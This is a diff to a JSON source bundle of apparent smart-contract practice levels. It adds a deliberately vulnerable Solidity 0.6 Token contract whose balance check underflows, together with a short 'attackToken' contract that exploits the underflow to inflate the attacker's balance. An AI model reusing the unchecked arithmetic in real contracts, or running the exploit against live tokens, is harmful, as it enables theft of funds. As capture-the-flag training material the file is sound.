@@ -75,5 +75,13 @@
         "file": "telephone.sol"
       }
     }
+  },
+  "token.sol": {
+    "__sources__": {
+      "token.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address => uint256) balances;\n    uint256 public totalSupply;\n\n    constructor(uint256 _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\ncontract attackToken{\n\n\nfunction attack(address _tokenAddress,uint256 _amount) public {\n//this will not revert even thou our balance is 0 because they are using sol old version\n// instead of reverting it will endup giving us a big balnce to withdraw from\n    Token(_tokenAddress).transfer(0x0000000000000000000000000000000000000001,_amount);\n}\n\n}",
+        "file": "token.sol"
+      }
+    }
   }
 }
